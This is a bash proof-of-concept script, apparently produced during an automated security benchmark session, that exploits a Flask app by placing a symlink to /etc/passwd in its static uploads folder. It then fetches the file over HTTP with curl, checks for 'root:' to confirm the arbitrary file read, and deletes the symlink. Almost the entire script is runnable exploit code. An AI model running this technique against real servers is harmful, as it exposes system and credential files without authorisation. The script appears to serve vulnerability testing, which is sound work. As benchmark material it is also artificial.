#!/bin/bash
# POC: Demonstrates symlink attack in Flask static uploads directory enabling arbitrary file read. Creates a symlink to /etc/passwd in the uploads folder and accesses it via HTTP, proving Flask follows symlinks and serves arbitrary file contents.
# Target: ./repo
# Created: 2025-11-04T17:29:07.579Z
# Session: benchmark-XBEN-024-24-mhktkgzl

# Symlink Attack in Upload Directory POC
# Demonstrates that Flask's send_from_directory() follows symlinks
# and serves arbitrary files accessible to the web server process

set -e

TARGET_URL="${1:-http://localhost}"
UPLOAD_DIR="/home/daytona/repo/app/static/uploads"

echo "[*] Symlink Attack POC - Arbitrary File Read via Flask Static Serving"
echo "[*] Target URL: $TARGET_URL"
echo "[*] Upload Directory: $UPLOAD_DIR"
echo ""

# Step 1: Verify the uploads directory exists
if [ ! -d "$UPLOAD_DIR" ]; then
    echo "[-] Error: Upload directory does not exist at $UPLOAD_DIR"
    echo "[*] This POC requires local filesystem access to create symlinks"
    exit 1
fi

echo "[+] Upload directory found: $UPLOAD_DIR"
echo ""

# Step 2: Create symlink to /etc/passwd
echo "[*] Creating symlink to /etc/passwd..."
SYMLINK_NAME="passwd_symlink_$(date +%s)"
SYMLINK_PATH="$UPLOAD_DIR/$SYMLINK_NAME"

# Clean up any existing symlink first
rm -f "$SYMLINK_PATH" 2>/dev/null || true

# Create the symlink
ln -s /etc/passwd "$SYMLINK_PATH"

if [ -L "$SYMLINK_PATH" ]; then
    echo "[+] Symlink created successfully: $SYMLINK_PATH"
    echo "[+] Points to: $(readlink $SYMLINK_PATH)"
    ls -la "$SYMLINK_PATH"
else
    echo "[-] Failed to create symlink"
    exit 1
fi

echo ""

# Step 3: Access the symlink via HTTP
echo "[*] Accessing symlink via HTTP GET request..."
RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET_URL/static/uploads/$SYMLINK_NAME")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
CONTENT=$(echo "$RESPONSE" | head -n-1)

echo "[+] HTTP Response Code: $HTTP_CODE"
echo ""

if [ "$HTTP_CODE" = "200" ]; then
    echo "[+] SUCCESS! Symlink was followed and file contents returned:"
    echo "[+] Response contains first 5 lines of /etc/passwd:"
    echo "$CONTENT" | head -n5
    echo ""
    
    # Verify it's actually /etc/passwd content
    if echo "$CONTENT" | grep -q "^root:"; then
        echo "[✓] VULNERABILITY CONFIRMED: Flask is following symlinks and serving arbitrary files!"
        echo "[✓] An attacker can read any file accessible to the web server process"
        RESULT=0
    else
        echo "[-] Response doesn't appear to be /etc/passwd content"
        echo "[*] Full response:"
        echo "$CONTENT"
        RESULT=1
    fi
else
    echo "[-] HTTP request failed with code $HTTP_CODE"
    echo "[*] Response: $CONTENT"
    RESULT=1
fi

# Step 4: Cleanup
echo ""
echo "[*] Cleaning up symlink..."
rm -f "$SYMLINK_PATH"

if [ ! -L "$SYMLINK_PATH" ]; then
    echo "[+] Symlink cleaned up"
fi

exit $RESULT